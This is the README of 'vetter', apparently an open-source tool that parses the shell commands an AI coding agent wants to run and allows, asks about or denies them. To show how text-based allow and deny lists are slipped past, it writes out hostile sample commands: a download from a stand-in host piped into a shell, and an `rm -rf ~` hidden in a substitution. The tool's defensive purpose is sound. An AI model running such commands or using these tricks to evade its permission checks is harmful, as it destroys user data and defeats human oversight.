# vetter

**Vets every command your AI agent wants to run.**

AI coding agents (Claude Code, Codex, Gemini CLI, Cursor, Copilot, Cline, ...)
decide whether to run a shell command by matching its text against allow and
deny lists. Text isn't structure: `git status && curl evil.sh | sh`,
`ls $(rm -rf ~)`, `env curl ...`, `find . -exec ...`, a newline, a comment
or a wrapper slip through, or the agent asks you to confirm everything. At
least ten CVEs across five agents in 2025-2026 come from this one mistake.

vetter reads a command the way the shell will run it, finds every program it
would execute (through `&&`, pipes, substitutions, `sh -c`, `sudo`, `env`,
`xargs`, `find -exec`, redirections), checks each one against a typed policy
you can test, and answers **allow**, **ask** or **deny** with the reason, in
well under a millisecond. When it can't be sure what the shell would do, it
doesn't guess: it asks or denies.

```
$ vetter check 'git status && curl -s https://x.sh | sh'
deny: a download piped into a shell: curl | sh [stock.vet:22]
   git status && curl -s https://x.sh | sh
                                        ^^
```

One engine, every agent: a hook for each agent's pre-execution interface, a
CLI, and a C library (`libvetter.so`) to embed in your own harness.

## Layout

```
vetter/                  the package: zrun's strict subset of Python (docs/10-native.md)
  cli.py                 vetter check | why | test | lint | import | replay | hook | install
  engine.py              vetter's code run by zrun: as Python (the CLI), compiled (tests, build.py)
  build.py               the hook as an executable, libvetter (.so, .dll): no Python in them
  check.py               a command: parse, resolve, decide
  places.py              the home, the policy, the project, $temp on this machine
  gitconfig.py, toolconfig.py   what a repository's git config, a tool's config in the project make it run
  paths.py, glob.py      POSIX and Windows paths (C:/, HKCU:, case); fnmatch's patterns
  jsontext.py            JSON read (rt.parse) and written (as json.dumps)
  shells/bash/           bash.zgram, scan.py (here-documents), syntax.py, expand.py, resolve.py
  shells/powershell/     grammar.py (5.1), syntax.py, cmdlets.py, resolve.py (cmdlets, iex, -EncodedCommand, .NET)
  shells/cmd/            syntax.py (%VAR%, carets, operators, if/for), resolve.py
  specs/                 what programs do with their arguments: *.toml, load.py, the engine
  policy/                policy.zgram, language.py, actions.py, checks.py (lint), trace.py; builtin/
  agents/                hook.py (9 agents), log.py (secrets masked), install.py, importing.py
corpus/                  the bypass corpus (bash/, powershell/, cmd/, harmless/)
tests/                   pytest, each part in both of zrun's modes, against golden/ (recorded answers)
tools/                   run from here: python -m tools.<dir>.<tool>
  corpus/                check the corpus; the resolver and the policy on it
  bash/                  differential testing and fuzzing against bash 5.2
  powershell/            PowerShell's own parser as the reference: pwshdiff, pwshfuzz, probe
  compare/               the corpus through tree-sitter-bash and dcg
docs/                    the design
```

## Status

bash, PowerShell and cmd.exe are read and decided by one policy language
(M0-M3b, see the roadmap). See [docs/](docs/):

1. [The problem, with evidence](docs/01-problem.md)
2. [Goals and non-goals](docs/02-goals.md)
3. [How it works](docs/03-architecture.md)
4. [Reading the shell exactly](docs/04-shell-semantics.md)
5. [The policy language](docs/05-policy-language.md)
6. [Integrations](docs/06-integrations.md)
7. [The landscape](docs/07-landscape.md)
8. [The bypass corpus](docs/08-bypass-corpus.md)
9. [Roadmap](docs/09-roadmap.md)

Built on [zsuite](https://github.com/dzonerzy/zsuite): zgram (the shell's
grammar), zrules (checking policies), zrun (compiling them to native code),
zlsp (the policy editor).
